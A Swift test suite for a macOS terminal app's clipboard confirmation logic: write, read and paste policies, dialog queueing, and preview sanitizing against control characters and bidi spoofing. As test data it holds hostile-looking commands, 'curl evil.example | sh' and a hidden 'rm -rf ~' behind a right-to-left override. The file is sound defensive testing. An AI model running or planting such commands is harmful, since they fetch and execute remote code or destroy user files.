import AppKit
import Testing
import AwesoMuxConfig
@testable import awesoMux

/// Stand-in for the write-confirmation dialog: records every prompt and holds
/// each open until the test closes it by text, so burst tests can control
/// interleaving (and the reset test can hold two dialogs open at once).
@MainActor
private final class ClipboardDialogRecorder {
    private(set) var promptedTexts: [String] = []
    private(set) var openPrompts: [String: CheckedContinuation<Bool, Never>] = [:]

    var openPrompt: String? { openPrompts.keys.first }

    func present(_ text: String) async -> Bool {
        promptedTexts.append(text)
        return await withCheckedContinuation { openPrompts[text] = $0 }
    }

    func close(_ text: String, confirmed: Bool) {
        openPrompts.removeValue(forKey: text)?.resume(returning: confirmed)
    }

    func closeAll(confirmed: Bool) {
        let all = openPrompts
        openPrompts = [:]
        for continuation in all.values {
            continuation.resume(returning: confirmed)
        }
    }
}

/// Bounded poll for the burst tests: a state-machine regression records a
/// failure instead of hanging the serialized suite. On timeout the gate and
/// the recorder are drained so `async let` writes still complete, letting the
/// test return instead of wedging at its implicit child-task await.
@MainActor
private func eventually(
    _ what: String,
    draining dialog: ClipboardDialogRecorder,
    _ condition: @MainActor () -> Bool
) async -> Bool {
    for _ in 0..<100_000 {
        if condition() { return true }
        await Task.yield()
    }
    Issue.record("timed out waiting for \(what)")
    GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
    dialog.closeAll(confirmed: false)
    return false
}

// Serialized: every test swaps the shared static confirmation provider and
// alert flags; the burst tests below also hold a fake dialog open across
// suspension points, so a parallel test's reset would strand them mid-wait.
@MainActor
@Suite("Ghostty clipboard write policy", .serialized)
struct GhosttyClipboardBridgeTests {
    @Test("allow policy writes without asking")
    func allowPolicyWritesWithoutAsking() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        GhosttyRuntime.clipboardWriteConfirmationProvider = { _, _, _ in
            Issue.record("Allow policy should not ask for confirmation")
            return false
        }

        #expect(await GhosttyRuntime.shouldWriteClipboard("payload", policy: .allow, confirm: true))
    }

    @Test("deny policy drops confirmed writes without asking")
    func denyPolicyDropsConfirmedWritesWithoutAsking() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        GhosttyRuntime.clipboardWriteConfirmationProvider = { _, _, _ in
            Issue.record("Deny policy should not ask for confirmation")
            return true
        }

        #expect(!(await GhosttyRuntime.shouldWriteClipboard("payload", policy: .deny, confirm: true)))
    }

    @Test("unconfirmed writes preserve local copy behavior")
    func unconfirmedWritesPreserveLocalCopyBehavior() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        GhosttyRuntime.clipboardWriteConfirmationProvider = { _, _, _ in
            Issue.record("Unconfirmed writes should not ask for confirmation")
            return false
        }

        #expect(await GhosttyRuntime.shouldWriteClipboard("payload", policy: .ask, confirm: false))
        #expect(await GhosttyRuntime.shouldWriteClipboard("payload", policy: .deny, confirm: false))
    }

    @Test("ask policy writes only when confirmation approves")
    func askPolicyWritesOnlyWhenConfirmationApproves() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        GhosttyRuntime.clipboardWriteConfirmationProvider = { text, _, _ in
            #expect(text == "payload")
            return true
        }
        #expect(await GhosttyRuntime.shouldWriteClipboard("payload", policy: .ask, confirm: true))

        GhosttyRuntime.clipboardWriteConfirmationProvider = { _, _, _ in false }
        #expect(!(await GhosttyRuntime.shouldWriteClipboard("payload", policy: .ask, confirm: true)))
    }

    @Test("ask policy drops duplicate writes while a confirmation is open")
    func askPolicyDropsDuplicateConcurrentWrites() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        GhosttyRuntime.clipboardWriteConfirmationProvider = { _, _, _ in
            #expect(GhosttyRuntime.isClipboardWriteAlertPresented)
            #expect(!(await GhosttyRuntime.shouldWriteClipboard("outer", policy: .ask, confirm: true)))
            return true
        }

        #expect(await GhosttyRuntime.shouldWriteClipboard("outer", policy: .ask, confirm: true))
        #expect(!GhosttyRuntime.isClipboardWriteAlertPresented)
    }

    @Test("ask policy re-prompts a distinct write after the open dialog closes")
    func askPolicyReasksQueuedDistinctWrite() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        let dialog = ClipboardDialogRecorder()
        GhosttyRuntime.clipboardWriteConfirmationProvider = { text, _, _ in
            await dialog.present(text)
        }

        async let first = GhosttyRuntime.shouldWriteClipboard("first", policy: .ask, confirm: true)
        guard await eventually("first prompt", draining: dialog, { dialog.openPrompt != nil }) else { return }

        async let second = GhosttyRuntime.shouldWriteClipboard("second", policy: .ask, confirm: true)
        guard await eventually("second write parked", draining: dialog, {
            GhosttyRuntime.pendingClipboardWriteTextForTesting == "second"
        }) else { return }

        // A duplicate of the waiting write drops immediately, without a slot.
        #expect(!(await GhosttyRuntime.shouldWriteClipboard("second", policy: .ask, confirm: true)))

        dialog.close("first", confirmed: true)
        #expect(await first)
        guard await eventually("second prompt", draining: dialog, { dialog.openPrompt != nil }) else { return }
        dialog.close("second", confirmed: true)
        #expect(await second)
        #expect(dialog.promptedTexts == ["first", "second"])
        #expect(!GhosttyRuntime.isClipboardWriteAlertPresented)
    }

    @Test("newer distinct write supersedes the waiting one")
    func askPolicySupersedesOlderPendingWrite() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        let dialog = ClipboardDialogRecorder()
        GhosttyRuntime.clipboardWriteConfirmationProvider = { text, _, _ in
            await dialog.present(text)
        }

        async let first = GhosttyRuntime.shouldWriteClipboard("first", policy: .ask, confirm: true)
        guard await eventually("first prompt", draining: dialog, { dialog.openPrompt != nil }) else { return }

        async let second = GhosttyRuntime.shouldWriteClipboard("second", policy: .ask, confirm: true)
        guard await eventually("second write parked", draining: dialog, {
            GhosttyRuntime.pendingClipboardWriteTextForTesting == "second"
        }) else { return }

        async let third = GhosttyRuntime.shouldWriteClipboard("third", policy: .ask, confirm: true)
        guard await eventually("third write superseding second", draining: dialog, {
            GhosttyRuntime.pendingClipboardWriteTextForTesting == "third"
        }) else { return }

        #expect(!(await second))

        dialog.close("first", confirmed: false)
        #expect(!(await first))
        guard await eventually("third prompt", draining: dialog, { dialog.openPrompt != nil }) else { return }
        dialog.close("third", confirmed: true)
        #expect(await third)
        #expect(dialog.promptedTexts == ["first", "third"])
        #expect(!GhosttyRuntime.isClipboardWriteAlertPresented)
    }

    @Test("stale cleanup after a reset does not clobber the rebuilt gate")
    func staleCleanupAfterResetLeavesGateIntact() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        let dialog = ClipboardDialogRecorder()
        let installRecorder = { @MainActor in
            GhosttyRuntime.clipboardWriteConfirmationProvider = { text, _, _ in
                await dialog.present(text)
            }
        }
        installRecorder()

        async let first = GhosttyRuntime.shouldWriteClipboard("first", policy: .ask, confirm: true)
        guard await eventually("first prompt", draining: dialog, { dialog.openPrompt != nil }) else { return }

        // Rebuild the gate while "first" is still suspended in its dialog —
        // the shape of a reset racing an open confirmation.
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        installRecorder()

        async let second = GhosttyRuntime.shouldWriteClipboard("second", policy: .ask, confirm: true)
        guard await eventually("second prompt", draining: dialog, {
            dialog.openPrompts["second"] != nil
        }) else { return }

        // Closing the pre-reset dialog must not release the gate "second" owns.
        dialog.close("first", confirmed: false)
        #expect(!(await first))
        #expect(GhosttyRuntime.isClipboardWriteAlertPresented)

        // The rebuilt gate still queues: a distinct write parks rather than
        // presenting a stacked dialog.
        async let third = GhosttyRuntime.shouldWriteClipboard("third", policy: .ask, confirm: true)
        guard await eventually("third write parked", draining: dialog, {
            GhosttyRuntime.pendingClipboardWriteTextForTesting == "third"
        }) else { return }

        dialog.close("second", confirmed: true)
        #expect(await second)
        guard await eventually("third prompt", draining: dialog, {
            dialog.openPrompts["third"] != nil
        }) else { return }
        dialog.close("third", confirmed: true)
        #expect(await third)
        #expect(!GhosttyRuntime.isClipboardWriteAlertPresented)
    }

    @Test("oversize write still reaches the confirmation prompt")
    func oversizeWriteStillPrompts() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        let oversize = String(repeating: "a", count: 2 * 1024 * 1024)
        GhosttyRuntime.clipboardWriteConfirmationProvider = { text, _, _ in
            #expect(text.utf8.count == 2 * 1024 * 1024)
            return true
        }

        #expect(await GhosttyRuntime.shouldWriteClipboard(oversize, policy: .ask, confirm: true))
    }

    @Test("confirmation provider receives the source window")
    func confirmationProviderReceivesSourceWindow() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        let window = NSWindow(
            contentRect: NSRect(x: 0, y: 0, width: 100, height: 100),
            styleMask: [.titled],
            backing: .buffered,
            defer: true
        )
        GhosttyRuntime.clipboardWriteConfirmationProvider = { _, _, parentWindow in
            #expect(parentWindow === window)
            return true
        }

        #expect(await GhosttyRuntime.shouldWriteClipboard(
            "payload",
            policy: .ask,
            confirm: true,
            parentWindow: window
        ))
    }

    @Test("confirmation body sanitizes preview")
    func confirmationBodySanitizesPreview() {
        let body = GhosttyRuntime.clipboardWriteConfirmationBody(
            for: "git clone https://good.example\nrm -rf ~\u{202E}txt"
        )

        #expect(body.contains("Preview: git clone https://good.example rm -rf ~ txt"))
        #expect(!body.contains("\nrm -rf"))
        #expect(!body.unicodeScalars.contains(Unicode.Scalar(0x202E)!))
    }

    @Test("confirmation body strips invisible formatting codepoints")
    func confirmationBodyStripsInvisibleFormatting() {
        // ZWJ, ZWNJ, and a variation selector are invisible — left in, the
        // rendered preview would differ from the bytes actually written,
        // letting a hostile OSC 52 payload spoof a benign-looking host.
        let body = GhosttyRuntime.clipboardWriteConfirmationBody(
            for: "good\u{200D}\u{200C}.example\u{FE0F}"
        )

        #expect(!body.unicodeScalars.contains(Unicode.Scalar(0x200D)!))
        #expect(!body.unicodeScalars.contains(Unicode.Scalar(0x200C)!))
        #expect(!body.unicodeScalars.contains(Unicode.Scalar(0xFE0F)!))
    }

    @Test("confirmation body includes source context")
    func confirmationBodyIncludesSourceContext() {
        let body = GhosttyRuntime.clipboardWriteConfirmationBody(
            for: "payload",
            sourceDescription: "workspace release\npane \u{202E}123"
        )

        #expect(body.contains("Source: workspace release pane 123"))
        #expect(!body.contains("\npane"))
        #expect(!body.unicodeScalars.contains(Unicode.Scalar(0x202E)!))
    }

    @Test("confirmation body bounds huge preview")
    func confirmationBodyBoundsHugePreview() {
        let body = GhosttyRuntime.clipboardWriteConfirmationBody(
            for: String(repeating: "a", count: 10_000)
        )

        #expect(body.contains("Preview: \(String(repeating: "a", count: 160))…"))
        #expect(body.count < 400)
    }

    @Test("unsafe paste confirmation body previews the pending paste content")
    func unsafePasteConfirmationBodyPreviewsContent() {
        let body = GhosttyRuntime.unsafePasteConfirmationBody(for: "curl evil.example | sh")

        #expect(body.contains("Preview: curl evil.example | sh"))
    }

    @Test("unsafe paste confirmation body sanitizes and bounds like the write dialog")
    func unsafePasteConfirmationBodyMirrorsWriteDialogLimits() {
        // Same sanitizer, same limits as clipboardWriteConfirmationBody — a
        // hostile paste payload can't smuggle control chars or bidi
        // overrides into the dialog either.
        let sanitized = GhosttyRuntime.unsafePasteConfirmationBody(
            for: "git clone https://good.example\nrm -rf ~\u{202E}txt"
        )
        #expect(sanitized.contains("Preview: git clone https://good.example rm -rf ~ txt"))
        #expect(!sanitized.unicodeScalars.contains(Unicode.Scalar(0x202E)!))

        let bounded = GhosttyRuntime.unsafePasteConfirmationBody(
            for: String(repeating: "a", count: 10_000)
        )
        #expect(bounded == "Preview: \(String(repeating: "a", count: 160))…")
    }

    @Test("sanitized alert title falls back for an empty pane title")
    func sanitizedAlertTitleFallsBackForEmptyPaneTitle() {
        #expect(GhosttyRuntime.sanitizedAlertTitle("") == "\u{2068}This terminal\u{2069}")
        // Whitespace-only titles are effectively empty after compaction too.
        #expect(GhosttyRuntime.sanitizedAlertTitle("   ") == "\u{2068}This terminal\u{2069}")
    }

    @Test("sanitized alert title bidi-isolates a real pane title")
    func sanitizedAlertTitleBidiIsolatesRealTitle() {
        #expect(GhosttyRuntime.sanitizedAlertTitle("deploy pane") == "\u{2068}deploy pane\u{2069}")
    }

    @Test("nil userdata on read-confirm logs instead of silently dropping")
    func nilUserdataLogsInsteadOfDropping() {
        #expect(GhosttyRuntime.describeNilUserdataReadConfirm() ==
            "confirmReadClipboard called with nil userdata — pending libghostty read request cannot be completed (no surface handle available)")
    }

    @Test("nil userdata on read-start logs instead of silently dropping")
    func nilUserdataOnReadStartLogsInsteadOfDropping() {
        #expect(GhosttyRuntime.describeNilUserdataReadClipboard() ==
            "readClipboard called with nil userdata — libghostty invoked the callback without a registered surface view (request cannot start)")
    }

    @Test("OSC 52 read confirmation asks before completing with clipboard data")
    func osc52ReadConfirmationAsksBeforeCompleting() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        var promptedTitle: String?
        GhosttyRuntime.clipboardReadConfirmationProvider = { title, parentWindow in
            #expect(parentWindow == nil)
            promptedTitle = title
            return .confirmed
        }

        var completions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "clipboard payload",
            requestKind: .osc52Read,
            paneTitle: "deploy pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { data, confirmed in
            completions.append((data, confirmed))
            return true
        }

        #expect(promptedTitle == "deploy pane")
        #expect(completions.count == 1)
        #expect(completions.first?.data == "clipboard payload")
        #expect(completions.first?.confirmed == true)
    }

    @Test("OSC 52 read confirmation still asks for empty clipboard payload")
    func osc52ReadConfirmationAsksForEmptyClipboardPayload() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        var promptCount = 0
        GhosttyRuntime.clipboardReadConfirmationProvider = { _, _ in
            promptCount += 1
            return .confirmed
        }

        var completions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "",
            requestKind: .osc52Read,
            paneTitle: "empty pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { data, confirmed in
            completions.append((data, confirmed))
            return true
        }

        #expect(promptCount == 1)
        #expect(completions.count == 1)
        #expect(completions.first?.data == "")
        #expect(completions.first?.confirmed == true)
    }

    @Test("confirm clipboard read disabled skips dialog and denies")
    func confirmClipboardReadDisabledSkipsDialogAndDenies() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        GhosttyRuntime.clipboardReadConfirmationProvider = { _, _ in
            Issue.record("Disabled read confirmation should not ask")
            return .confirmed
        }

        var completions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "clipboard payload",
            requestKind: .osc52Read,
            paneTitle: "deploy pane",
            parentWindow: nil,
            confirmClipboardRead: false
        ) { data, confirmed in
            completions.append((data, confirmed))
            return true
        }

        #expect(completions.count == 1)
        #expect(completions.first?.data == "")
        #expect(completions.first?.confirmed == false)
    }

    @Test("unsafe paste confirmation only handles paste requests")
    func unsafePasteConfirmationOnlyHandlesPasteRequests() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        var unsafePastePrompts = 0
        var promptedPasteData: String?
        GhosttyRuntime.unsafePasteConfirmationProvider = { data, parentWindow in
            #expect(parentWindow == nil)
            promptedPasteData = data
            unsafePastePrompts += 1
            return .confirmed
        }
        GhosttyRuntime.clipboardReadConfirmationProvider = { _, _ in
            Issue.record("Read confirmation should not be part of this paste branch")
            return .cancelled
        }

        var pasteCompletions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "echo hi\n",
            requestKind: .paste,
            paneTitle: "paste pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { data, confirmed in
            pasteCompletions.append((data, confirmed))
            return true
        }

        var writeCompletions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "ignored",
            requestKind: .osc52Write,
            paneTitle: "write pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { data, confirmed in
            writeCompletions.append((data, confirmed))
            return true
        }

        #expect(unsafePastePrompts == 1)
        #expect(promptedPasteData == "echo hi\n")
        #expect(pasteCompletions.count == 1)
        #expect(pasteCompletions.first?.data == "echo hi\n")
        #expect(pasteCompletions.first?.confirmed == true)
        #expect(writeCompletions.count == 1)
        #expect(writeCompletions.first?.data == "")
        #expect(writeCompletions.first?.confirmed == false)
    }

    @Test("unsafe paste cancellation aborts the paste")
    func unsafePasteCancellationAbortsPaste() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        GhosttyRuntime.unsafePasteConfirmationProvider = { _, _ in .cancelled }

        var completions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "echo hi\n",
            requestKind: .paste,
            paneTitle: "paste pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { data, confirmed in
            completions.append((data, confirmed))
            return true
        }

        #expect(completions.count == 1)
        #expect(completions.first?.data == "")
        #expect(completions.first?.confirmed == false)
    }

    @Test("read confirmation drops nested requests while alert is presented")
    func readConfirmationDropsNestedRequestsWhileAlertPresented() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        GhosttyRuntime.clipboardReadConfirmationProvider = { _, _ in
            #expect(GhosttyRuntime.isClipboardReadAlertPresented)
            var nestedCompletions: [(data: String, confirmed: Bool)] = []
            await GhosttyRuntime.resolveClipboardConfirmationRequest(
                data: "nested",
                requestKind: .osc52Read,
                paneTitle: "nested pane",
                parentWindow: nil,
                confirmClipboardRead: true
            ) { data, confirmed in
                nestedCompletions.append((data, confirmed))
                return true
            }
            #expect(nestedCompletions.count == 1)
            #expect(nestedCompletions.first?.data == "")
            #expect(nestedCompletions.first?.confirmed == false)
            return .confirmed
        }

        var completions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "outer",
            requestKind: .osc52Read,
            paneTitle: "outer pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { data, confirmed in
            completions.append((data, confirmed))
            return true
        }

        #expect(completions.count == 1)
        #expect(completions.first?.data == "outer")
        #expect(completions.first?.confirmed == true)
        #expect(!GhosttyRuntime.isClipboardReadAlertPresented)
    }

    @Test("read confirmation tolerates a completion that never reaches the surface")
    func readConfirmationToleratesCompletionThatNeverReachesSurface() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        GhosttyRuntime.clipboardReadConfirmationProvider = { _, _ in .confirmed }

        var completionCallCount = 0
        // Returning false simulates GhosttySurfaceInputBridge.
        // completeClipboardRequest's `guard let surface else { return false }`
        // firing because the pane was torn down while its dialog was up.
        // resolveClipboardConfirmationRequest must not crash or hang, and the
        // dedup flag must still clear (asserted below via a follow-up request).
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "clipboard payload",
            requestKind: .osc52Read,
            paneTitle: "torn down pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { _, _ in
            completionCallCount += 1
            return false
        }

        #expect(completionCallCount == 1)
        #expect(!GhosttyRuntime.isClipboardReadAlertPresented)
    }

    @Test("unsafe paste confirmation tolerates a completion that never reaches the surface")
    func unsafePasteConfirmationToleratesCompletionThatNeverReachesSurface() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        GhosttyRuntime.unsafePasteConfirmationProvider = { _, _ in .confirmed }

        var completionCallCount = 0
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "echo hi\n",
            requestKind: .paste,
            paneTitle: "torn down pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { _, _ in
            completionCallCount += 1
            return false
        }

        #expect(completionCallCount == 1)
        #expect(!GhosttyRuntime.isUnsafePasteAlertPresented)
    }
}
